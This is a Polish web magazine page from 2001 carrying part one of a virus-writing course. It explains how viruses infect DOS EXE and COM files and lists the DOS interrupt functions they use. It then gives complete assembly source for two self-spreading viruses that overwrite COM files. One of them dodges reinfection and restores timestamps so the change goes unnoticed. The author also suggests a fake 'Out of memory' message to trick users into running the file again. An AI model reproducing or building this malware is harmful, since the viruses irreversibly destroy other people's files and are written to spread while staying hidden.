<html><head><style>A:link {text-decoration: none} A:visited {text-decoration: none} A:active {text-decoration: none} A:hover {text-decoration: none;color="#ffffff"} </style><title>Mag@Zin #1 :: Hard & Soft</title><meta http-equiv=Content-Type content="text/html; charset=iso-8859-2"></head><body link="#98ccff" vlink="#98ccff" alink="#C4E6FF" LEFTMARGIN=0 TOPMARGIN=0 MARGINWIDTH=0 MARGINHEIGHT=0><table height=45 width=100% cellpadding=0 cellspacing=0 border=0><tr><td width=65% height=49 align=left bgcolor="#3165CE"><b><font face=Verdana color="#FFFFFF" size=2>&nbsp; Internetowy Magazyn Dyskowy<br><font face="Arial, Helvetica, sans-serif" color="#FFFFFF">&nbsp; </font></font></b><font face=Verdana color="#FFFFFF" size=1>Numer 1 maj 2001</font></td><td width=35% align=right class=font nowrap bgcolor="#3165CE"><p align=center><img border=0 src="../img/logos.gif" width=256 height=40></p></td></tr></table><table cellpadding=5 cellspacing=0 border=0 height=787 width=770 align=left><tr height=480><td height=777 width=135 valign=top align=center bgcolor="#008DF6"><table border=0 width="100%" cellspacing=0 cellpadding=0><tr><td width="100%" height=15></td></tr><tr><td width="100%" align=center bgcolor="#000000"><p align=center><font size=2><b><font face=Verdana color="#FFFFFF">INTRO</font></b></font></td></tr><tr><td width="100%" align=center height=10></td></tr><tr><td width="100%" align=center><span style="font-size:8pt;mso-bidi-font-size:12.0pt; font-family:Verdana"><b><a href="intro.htm">Wstêpniak<a/><br></a><a href="intro.htm#Intro :: Co w numerze&nbsp;">Co w numerze</a><br><a href="intro.htm#Intro :: Prenumerata">Prenumerata</a><br><a href="intro.htm#Intro :: Redakcja">Redakcja</a><br><a href="intro.htm#Intro :: Wspó³praca">Wspó³praca</a></b></span></td></tr><tr><td width="100%" align=center height=10></td></tr><tr><td width="100%" align=center bgcolor="#000000"><font size=2><b><font face=Verdana color="#FFFFFF">GRAMY!</font></b></font></td></tr><tr><td width="100%" align=center height=10></td></tr><tr><td width="100%" align=center><span style="font-size:8pt;mso-bidi-font-size:12.0pt; font-family:Verdana"><b><a href="doom.htm">Doom</a><br><a href="dsj.htm">Deluxe Ski Jump</a><br><a href="home.htm">Homeworld</a><br><a href="mk.htm">Mortal Kombat</a><br><a href="mr2.htm">Moto Racer 2<br></a><a href="radix.htm">Radix<br></a></b><a href="thps2.htm"><b>THPS2</b></a></span></td></tr><tr><td width="100%" align=center height=10></td></tr><tr><td width="100%" align=center bgcolor="#000000"><font face=Verdana color="#FFFFFF" size=2><b>HARD &amp; SOFT</b></font></td></tr><tr><td width="100%" align=center height=10></td></tr><tr><td width="100%" align=center><font color="#98CCFF"><b><a href="virus.htm"><span style="font-size: 8pt; mso-bidi-font-size: 12.0pt; font-family: Verdana">Kurs pisania wirusów, cz. 1<br></span></a><span style="font-size: 8pt; mso-bidi-font-size: 12.0pt; font-family: Verdana"><a href="winrar.htm">WinRAR 2.80<br> &nbsp;</a></span></b><span style="font-size: 8pt; mso-bidi-font-size: 12.0pt; font-family: Verdana"><a href="procesor.htm"><b>Podkrêcanie AMD K6-2 400 MHz</b></a><b><br><a href="dos.htm">DOS dla beginnera</a></b></span></font></td></tr><tr><td width="100%" align=center height=10></td></tr><tr><td width="100%" align=center bgcolor="#000000"><font face=Verdana color="#FFFFFF" size=2><b>CZYTELNIA</b></font></td></tr><tr><td width="100%" align=center height=10></td></tr><tr><td width="100%" align=center><span style="font-size:8pt;mso-bidi-font-size:12.0pt; font-family:Verdana"><b><a href="prm.htm">Rynek muzyczny<br></a></b><a href="mcfuck.htm"><b>McFuck</b></a></span></td></tr><tr><td width="100%" align=center height=10></td></tr><tr><td width="100%" align=center bgcolor="#000000"><font face=Verdana color="#FFFFFF" size=2><b>OPOWIADANIA</b></font></td></tr><tr><td width="100%" align=center height=10></td></tr><tr><td width="100%" align=center><span style="font-size: 8pt; mso-bidi-font-size: 12.0pt; font-family: Verdana"><a href="platek.htm"><b>P³atek ¶niegu</b></a></span></td></tr><tr><td width="100%" align=center height=10></td></tr><tr><td width="100%" align=center height=10 bgcolor="#000000"><font face=Verdana color="#FFFFFF" size=2><b>NAMIARY</b></font></td></tr><tr><td width="100%" align=center height=10></td></tr><tr><td width="100%" align=center height=10><font face=Verdana size=1><b><font color="#FFFFFF">e-mail:<br></font></b><font color="#FFFFFF"><a href="mailto:magazin@hoga.pl"><b>magazin@hoga.pl</b></a></font></font></td></tr><tr><td width="100%" align=center height=10></td></tr><tr><td width="100%" align=center><font face=Verdana size=1><b><font color="#FFFFFF">www:<br></font></b><font color="#FFFFFF"><a href="http://www.magazin.prv.pl"><b>www.magazin.prv.pl</b></a></font></font></td></tr><tr><td width="100%" align=center></td></tr></table></td><td height=777 width=611 align=center valign=top bgcolor=#FFFFFF><div align=right><table width=599 cellspacing=0 cellpadding=0 border=0 height=643><tr><td width=593 height=15><p align=right></p></td></tr><tr bgcolor=#008DF6><td height=20 valign=middle class=font width=597><font face=Verdana size=2>&nbsp;&nbsp;</font><font color="#FFFFFF" face=Verdana size=2><b>Hard &amp; Soft :: Kurs pisania wirusów, cz. 1</b></font></td></tr><tr bgcolor=#008DF6><td height=20 valign=middle class=font width=597 bgcolor="#3165CE"><p align=right><font face=Verdana size=2><span style="font-size:8pt;mso-bidi-font-size:12.0pt; font-family:Arial"><b><font color="#C4E6FF">&nbsp;&nbsp;</font><font color="#98CCFF"> txt: <a href="mailto:binboy@free.com.pl">Binboy &nbsp;&nbsp;&nbsp;</a></font></b></span></font></td></tr><tr><td height=591 valign=top class=font width=597><p align=justify><font face=Arial><b><i><br></i></b></font><span style="font-size: 8pt; mso-bidi-font-size: 12.0pt; font-family: Verdana"> Na pocz±tek krótka gadka:<br><br><font color="#ff0000">&quot;!! UWAGA !! Nie ponoszê ¿adnej odpowiedzialno¶ci za szkody spowodowane jakimkolwiek praktykowaniem informacji zawartych w tym FAQ.&quot;</font><br><br>Teraz mo¿na ju¿ zacz±æ :-):<br><br>To jest chyba pierwsze FAQ na temat wirusów, a dok³adnie na temat pisania wirusów. Nie wiem, czy to siê komu¶ przyda, czy nie. Jak kto¶ nie chce, to niech nie czyta. Nikogo nie zmuszam. Do nauki pisania wirusów bêdzie potrzebnych kilka narzêdzi:<br><br>&middot; jaki¶ kompilator asemblerowy, np. A86, czy TASM i TLINK<br> &middot; trochê czasu<br> &middot; z³y humor :-)<br> &middot; podstawy z programowania w Assemblerze<br><br>Kompilator mo¿na znale¼æ na mojej stronie:&nbsp;<br><br><a href="http://binboy.koti.com.pl">http://binboy.koti.com.pl</a><br><br>Zak³adam, ¿e osoba czytaj±ca ten tekst, czyli np. TY ma pewne pojecie o Assemblerze. Mimo, ¿e bêdê siê stara³ niektóre rzeczy t³umaczyæ dok³adniej od podstaw, tych, którzy nie maja o tym jêzyku zielonego pojêcia odsy³am do przeczytania najpierw kursu programowania w Assemblerze. Bardzo dobry kurs znajduje siê na mojej stronie.<br><br><a href="mailto:binboy@free.com.pl">binboy@free.com.pl</a> lub <a href="mailto:binboy@ulgo.koti.com.pl">binboy@ulgo.koti.com.pl</a><br><br>Czekam równie¿ na propozycje, sugestie itp.<br><br>Tekst ten mo¿na dowolnie kopiowaæ, zamieszczaæ na swoich stronach internetowych publikowaæ w dowolnych czasopismach, itp. Zezwalam równie¿ na ma³± modyfikacje (poprawienie b³êdów ortograficznych, itp.J). Proszê tylko o zaznaczenie autora tekstu (BY BINBOY).<font color="#008DF6"><br><br><b>1. Zaczynamy</b><br></font><br>Istnieje wiele wirusów. Powstaje ich coraz wiêcej. Zwi±zane jest to g³ównie z tym, ze na rynku powstaj± coraz to nowsze programy, które praktycznie same tworz± nowe &quot;szkodniki&quot;. My jako pseudoautorzy podajemy tylko ich podstawowe parametry, a g³ównie autora. Wiêkszo¶æ programów antywirusowych potrafi wykryæ wirusy stworzone przy pomocy takich programów. Wszystkie one maja jakie¶ cechy wspólne. Jednak przez pewne ró¿nice w kodzie programy antywirusowe nie potrafi± ich usun±æ. Uwa¿am, ze takie pisanie wirusów jest do niczego. Du¿o wiêcej frajdy sprawia stworzenie takiego szkodnika, który nie jest wykrywany przez skanery, a przy okazji pokazuje jaki¶ ciekawy efekt graficzny, b±d¼ d¼wiêkowy. Wirusy doklejaj± siê prawie do wszystkich plików. Potrafi± zaatakowaæ pliki typu: EXE, COM, SYS, DLL, VXD, XLS, DOC. S± próby nawet plików BAT. By stworzyæ wirusa danego typu pliku trzeba poznaæ jego budowê. Po krotce:<br><br>a) pliki typu EXE posiadaj± w³asny nag³ówek, w którym zapisany jest punkt startu programu, czyli odk±d ma ruszyæ wykonywanie programu po jego uruchomieniu. Wiêkszo¶æ wirusów plików EXE dokleja siê na ich koñcu zapamiêtuj±c punkt startu znajduj±cy siê w jego nag³ówku i zmieniaj±c go na adres w³asnego kodu. Po uruchomieniu tak zara¿onego pliku uruchomiony zostaje najpierw kod wirusa, a nastêpnie w³a¶ciwy kod programu.<br><br>b) pliki typu COM s± du¿o prostsze. Nie posiadaj± one nag³ówka. Ca³y program mie¶ci siê w jednym segmencie, co u³atwia pisanie wirusa. Programy typu COM wykonywane s± zawsze spod tego samego punktu startu, jest to 100H. Dlatego wiêkszo¶æ wirusów atakuj±cych takie pliki dopisuje siê na ich koñcu zapamiêtuj±c pierwsze trzy bajty oryginalnego programu i zmieniaj±c je na instrukcje JMP adres, gdzie adres - jest to pocz±tek kodu wirusa.&nbsp;<br><br><font color="#008DF6"><b>2. Podstawowe komendy</b><br></font><br>Na pocz±tek wyt³umaczê (przypomnê) kilka komend z Assemblera, które bêd± potrzebne do napisania naszego bardzo prymitywnego wirusa. Wyt³umaczê to bardzo ogólnie. I tak:<br><br><font color="#008DF6">Rejestry ogólnego przeznaczenia:<br></font><br><font color="#008DF6">AX</font> - dzieli siê na <font color="#008DF6">AH</font> i <font color="#008DF6">AL</font><br><font color="#008DF6">BX </font>- dzieli siê na <font color="#008DF6">BH </font>i <font color="#008DF6">BL</font><br><font color="#008DF6">CX</font> - dzieli siê na <font color="#008DF6">CH </font>i <font color="#008DF6">CL</font><br><font color="#008DF6">DX </font>- dzieli siê na <font color="#008DF6">DH </font>i <font color="#008DF6">DL</font><br><br><font color="#008DF6">Rejestry segmentowe:<br></font><br><font color="#008DF6">CS </font>- segment kodu<br><font color="#008DF6">DS </font>- segment danych<br><br><font color="#008DF6">Rejestr znaczników:&nbsp;<br></font><br>do tego rejestru programista nie ma bezpo¶redniego dostêpu, mo¿e poszczególne jego bity zmieniaæ przy pomocy innych instrukcji Assemblera.<br><br><font color="#008DF6">Podstawowe komendy:<br></font><br><font color="#008DF6">MOV X,Y</font> - instrukcja kopiuje zawarto¶æ rejestru, lub komórki pamiêci X do rejestru lub komórki Y. Nie wolno kopiowaæ komórki pamiêci do komórki pamiêci. Jako X mo¿emy równie¿ podaæ warto¶æ sta³±. Nie wolno przesy³aæ warto¶ci sta³ej do rejestru segmentowego.<br><br><font color="#008DF6">INT X</font> - instrukcja powoduje wywo³anie przerwania o numerze X&nbsp;<br><font color="#008DF6" size=2>JMP X</font> - instrukcja powoduje wykonanie skoku bezwarunkowego pod adres X<br><font color="#008DF6">XCHG X,Y</font> - instrukcja powoduje zamianê miedzy sob± warto¶ci dwóch rejestrów.<br><font color="#008DF6">XOR X,Y</font> - rozkaz oblicza sumê symetryczna rejestrów X i Y. Je¶li wykonamy ta instrukcje na tych samych rejestrach, to zostan± one wyzerowane, np. XOR AX,AX (AX=0)<br><br>Do napisania pierwszego wirusa bêd± nam potrzebne równie¿ pewne przerwania:<br><br><font color="#008DF6">INT 21H</font> - przerwanie 21H (wywo³anie funkcji DOS-u)<br><font color="#008DF6">MOV AH,x</font> - X - numer funkcji przerwania<br><font color="#008DF6"><br>AH=4EH</font> - funkcja powoduje szukanie pliku w katalogu bie¿±cym o nazwie, do której adres podany jest w DS:DX. W nazwie tej mo¿na u¿ywaæ gwiazdek i znaku zapytania. W rejestrze CX podajemy atrybut szukanego pliku. Je¶li plik zostanie znaleziony znacznik C zostanie wyzerowany, w DTA bêdzie znajdowa³ siê opis znalezionego pliku. Je¶li wyst±pi b³±d znacznik C bêdzie ustawiony (=1), a w rejestrze AX bêdzie kod powsta³ego b³êdu.<br><br>Blok DTA zaczyna siê od adresu 80H i ma nastêpuj±c± budowê:<br><font color="#008DF6"><br>OFFSET ROZMIAR ZAWARTO¦Æ<br> 0H 15H Zarezerwowane dla funkcji 4FH<br> 15H 1H Atrybuty<br> 16H 2H Czas ostatniej modyfikacji<br> 18H 2H Data ostatniej modyfikacji<br> 1AH 4H Rozmiar pliku w bajtach<br> 1EH 0DH Nazwa pliku</font><font face="Courier New" color="#008DF6"><br></font><br>Tak wiec nazwa znalezionego pliku znajduje siê pod adresem 9EH.<br><br><font color="#008DF6">AH=4FH</font> - funkcja powoduje szukanie kolejnego pliku. Je¶li nie zostanie znaleziony znacznik C zostanie ustawiony.<br><br><font color="#008DF6">AH=3DH</font> - funkcja powoduje otwarcie pliku. W DS:DX podajemy adres nazwy pliku w kodzie ASCIIZ, czyli nazwa musi byæ zakoñczona kodem ASCII 0, a w AL podajemy tryb dostêpu. Mamy do dyspozycji:<br><br><font size=2 face="Courier New" color="#008DF6">AL=0</font> - tylko do odczytu<br><font color="#008DF6">AL=1</font> - tylko do zapisu<br><font size=2 face="Courier New" color="#008DF6">AL=2</font> - do odczytu i zapisu<br><br>Je¶li powstanie jaki¶ b³±d podczas otwierania pliku zostanie ustawiony znacznik C, w przeciwnym razie w rejestrze AX znajdowaæ siê bêdzie numer doj¶cia do pliku.<br><br><font color="#008DF6">AH=3EH </font>- funkcja powoduje zamkniecie doj¶cia do pliku. Pliki trzeba zamkn±æ by wprowadzone zmiany zosta³y zachowane. W rejestrze BX podajemy numer doj¶cia do pliku, który chcemy zamkn±æ.<br><br><font color="#008DF6">AH=40H</font> - funkcja powoduje zapisanie CX bajtów do pliku zwi±zanego z doj¶ciem podanym w BX. Zapisane zostan± bajty zaczynaj±c od adresu DS:DX.<br><br><font color="#008DF6">AH=42H</font> - funkcja powoduje ustalenie pozycji wska¼nika w pliku. W rejestrze BX podajemy numer doj¶cia do naszego pliku, w CX:DX adres przesuniêcia, a w AL sposób przesuniêcia. Mamy trzy rodzaje przesuniêæ:<br><br><font color="#008DF6">AL=0</font> - wzglêdem pocz±tku pliku<br><font color="#008DF6">AL=1</font> - wzglêdem aktualnej pozycji wska¼nika w pliku<br><font color="#008DF6">AL=2</font> - wzglêdem koñca pliku<br><br>Po wykonaniu przerwania w DX:AX znajduje siê aktualna pozycja kursora. Je¶li wiêc chcemy ustawiæ kursor na koñcu pliku rejestry CX i DX bêd± równe zero, a przesuniecie bêdzie wzglêdem koñca pliku (AL=2). Funkcja ta to tak¿e sposób na odczytanie d³ugo¶ci pliku. Wywo³ana z AL=2, CX=DX=0 zwróci w DX:AX d³ugo¶æ pliku.<br><br><font color="#008DF6"><b>3. To do dzie³a</b></font><font color="#008DF6"><br></font><br>Pierwszym naszym wirusem bêdzie wirus o nazwie TINY. Zajmuje on tylko 32 bajty. Dokleja siê on na pocz±tku pliku COM zamazuj±c oryginalny kod. Tak zara¿onych plików nie da siê ju¿ odzyskaæ.<br><br>Nasz wirus bêdzie wykonywa³ nastêpuj±ce czynno¶ci:<br><br>1. szuka pliku do zara¿enia<br> 2. otwiera znaleziony plik<br> 3. zapisuje samego siebie<br><br>Wirus wiêc wygl±da tak:<br><br><font color="#008DF6">start: ; pocz±tek wirusa<br> MOV AH,4EH ; szukanie pliku<br> MOV DX,OFFSET maska ; z rozszerzeniem COM<br> INT 21H<br> MOV AX,3D02H ; otwarcie pliku<br> MOV DX,09EH ; nazwa znalezionego pliku z bloku DTA<br> INT 21H<br> XCHG AX,BX ; do BX numer doj¶cia<br> MOV AH,40H ; pisanie w pliku<br> MOV CL,20H ; CL=20H --&gt; CL=32 - d³ugo¶æ zapisywanego pliku<br> MOV DX,OFFSET start ; pocz±wszy od pocz±tku wirusa<br> INT 21H<br> RET ; zakoñczenie programu<br> maska DB &quot;*.COM&quot;,0 ; szukany plik&nbsp;<br> end start</font><br><br>Jest to bardzo prymitywny wirus. Nie wy¶wietla ¿adnego napisu. Zara¿one pliki zmieniaj± swoja datê oraz czas ostatniej modyfikacji. Wirus równie¿ nie zarazi pliku, który ma na³o¿one jakie¶ atrybuty. Jednak program powy¿szy mo¿na nazwaæ WIRUSEM, gdy potrafi siê rozprzestrzeniaæ. Mo¿na w pewien sposób poprawiæ naszego wirusa dostawiaj±c na jego koñcu napis np. &quot;Out of memory&quot;, tak by po zara¿eniu pliku napis ten zosta³ wy¶wietlony. Powinno to zmyliæ potencjalnego u¿ytkownika i skusiæ do powtórzenia tej operacji. Wirusy tego typu maja jedna zaletê. Zara¿one programy nie zmieniaj± swojej objêto¶ci.<br><br>Jest jeszcze jeden wirus o nazwie TRIVIAL.127. Jest to poprawiona wersja naszego TINY'ego. Czym ona siê ró¿ni?<br><br>1. nie zara¿a plików wcze¶niej zara¿onych<br> 2. kontroluje ewentualne b³êdy<br> 3. pliki nie zmieniaj± swojej daty i czasu ostatniej modyfikacji<br><br>Zastanówmy siê jak zrobiæ poszczególne te elementy.<br><br>Nasz wirus musi byæ trochê bardziej inteligentny i je¶li znajdzie plik, który zosta³ wcze¶niej ju¿ zara¿ony, to niech go nie zaraza jeszcze raz tylko poszuka kolejnej ofiary. By to uczyniæ musi jako¶ przetestowaæ znaleziony plik i stwierdziæ, w nim obecno¶æ swojego kodu b±d¼ nie. W wirusie TRIVIAL.127 pos³u¿ono siê w tym celu pierwszymi dwoma bajtami. Ca³y wirus zaczyna siê od instrukcji MOV BX,BX, która ma kod 8BDB. Teraz po znalezieniu ofiary, zostaj± sprawdzone jej dwa pierwsze bajty i je¶li to 8BDB, to szukamy drugiego pliku, a je¶li nie to zara¿amy. By uczyniæ powy¿sze zadanie przypomnê kilka instrukcji, które bêd± nam potrzebne:<br><br><font color="#008DF6">CMP X,Y</font> - instrukcja powoduje porównanie dwóch rejestrów, b±d¼ rejestru i sta³ej oraz na podstawie wyniku odpowiednie ustawienie znaczników.<br><br><font color="#008DF6">JC adres</font> - jest to skok warunkowy. Je¶li znacznik C jest ustawiony (=1) to zostanie wykonany skok pod wskazany adres.<br><br><font color="#008DF6">JE adres</font> - skok gdy warto¶ci rejestrów X i Y s± takie same (X=Y)<br><br><font color="#008DF6">JNE adr</font> - skok gdy warto¶ci X i Y s± ró¿ne (X!=Y lub X&lt;&gt;Y)<br><br><font color="#008DF6">PUSH rej </font><font color="#008DF6"></font>- instrukcja powoduje zapamiêtanie na stosie warto¶ci rejestru REJ<br><br><font color="#008DF6">POP rej</font> - instrukcja powoduje zdjêcie ze stosu warto¶ci i zapamiêtanie jej w rejestrze REJ.<br><br><font color="#008DF6">CALL adr</font> - instrukcja powoduje skok do procedury, która musi byæ zakoñczona instrukcj± RET<br><br><font color="#008DF6">RET</font> - powoduje powrót z procedury do miejsca, z którego zosta³a wywo³ana.<br><br>Bêdzie równie¿ potrzebnych kilka przerwañ (funkcji):<br><br><font color="#008DF6">INT 21H</font> - przerwanie 21H<br><font color="#008DF6">MOV AL,X</font> - X - numer funkcji<br><br><font color="#008DF6">AH=3FH</font> - funkcja powoduje czytanie pliku. W rejestrze BX podajemy numer doj¶cia do pliku, w CX liczbê czytanych bajtów, a w DS:DX adres bufora, gdzie zostan± zapamiêtane dane. Je¶li wyst±pi podczas operacji jaki¶ b³±d, to zostanie ustawiony znacznik C, a rejestr AX bêdzie zawiera³ kod powsta³ego b³êdu. Je¶li natomiast operacja zakoñczy siê sukcesem, to w AX bêdzie zapisana liczba przeczytanych bajtów.<br><br><font color="#008DF6">AH=57H</font> - funkcja ustawia lub sprawdza aktualna datê oraz czas ostatniej modyfikacji. Je¶li AL=0 to sprawdzamy, a wtedy podajemy w BX numer doj¶cia i po wykonaniu przerwania w CX znajduje siê czas, a w DX data modyfikacji. Gdy AL=1 to ustawiamy, wtedy podajemy równie¿ w BX numer doj¶cia i w CX czas, a DX datê modyfikacji.<br><br><font color="#008DF6">AH=4CH</font> - funkcja powoduje zakoñczenie wykonywania programu i zwrócenie warto¶ci podanej w AL przez ten program.<br><br>Nasz wirus wiec wygl±da tak:<br><br><font color="#008DF6">start: ; pocz±tek kodu wirusa<br> MOV BX,BX ; instrukcja charakterystyczna dla wirusa<br> MOV AH,4EH ; szukanie pliku<br> MOV CX,0 ; ustalenie atrybutów szukanego pliku<br> MOV DX,OFFSET maska ; nazwa szukanego pliku (*.COM)<br> etyk1:<br> INT 21H<br> JC etyk2 ; je¶li nie znaleziono pliku, to skok pod ETYK2<br> CALL proc1 ; je¶li znaleziono, to infekcja - skok to PROC1<br> MOV AH,4FH ; szukanie nastêpnego<br> JMP etyk1 ; skok na pocz±tek ETYK1<br> etyk2:&nbsp;<br> MOV AX,4C00H ; zakoñczenie programu<br> INT 21H<br> proc1: ; procedura zara¿a plik<br> MOV AX,3D02H ; otwarcie pliku do odczytu i zapisu<br> MOV DX,9EH ; nazwa w bloku DTA, czyli adres 9EH<br> INT 21H<br> XCHG BX,AX ; do BX numer doj¶cia do pliku<br> MOV AH,3FH ; czytanie z pliku<br> MOV CX,2 ; dwóch pierwszych bajtów<br> MOV DX,OFFSET bufor ; i zapamiêtanie ich w Buforze<br> INT 21H<br> CMP WORD PTR bufor, 08BDBH ; je¶li wczytane bajty to 8BDB<br> JE etyk4 ; tzn. ze plik zosta³ ju¿ zara¿ony<br> XOR DX,DX ; wyzerowanie rejestru DX<br> MOV CX,DX ; do CX warto¶æ DX, czyli CX=0<br> MOV AX,4200H ; ustawienie wska¼nika na pocz±tku pliku<br> INT 21H<br> MOV AL,0 ; AL=0, czyli<br> MOV AH,57H ; sprawdzenie daty i czasu ostatniej&nbsp;<br> INT 21H ; modyfikacji<br> PUSH CX ; zapamiêtanie czasu<br> PUSH DX ; i daty na stosie<br> MOV AH,40H ; zapisanie w pliku<br> MOV CX,OFFSET koniec-OFFSET start ; d³ugo¶æ wirusa bajtów<br> MOV DX,100H ; pocz±wszy od adresu 100H (pocz±tek kodu)<br> INT 21H<br> MOV AL,1 ; AL=1<br> POP DX ; zdjêcie ze stosu daty i<br> POP CX ; czasu ostatniej modyfikacji<br> MOV AH,57H ; zmiana owych parametrów pliku, gdy¿ AL=1<br> INT 21H&nbsp;<br> etyk4:<br> MOV AH,3EH ; zamkniêcie doj¶cia do pliku<br> INT 21H&nbsp;<br> RET ; powrót z procedury<br> bufor DW 0 ; bufor<br> maska DB &quot;*.COM&quot;,0 ; nazwa szukanego pliku</font></span></td></tr><tr><td height=15 valign=bottom class=font width=597></td></tr><tr bgcolor=#008DF6><td height=24 valign=middle class=font width=597></td></tr><tr><td height=35 width=597 valign=bottom><center><font size=1 face="Arial, Helvetica, sans-serif">All rights reserved<br> 2001 &copy; Copyright Loopus</font></center></td></tr></table></div></td></tr></table></body></html>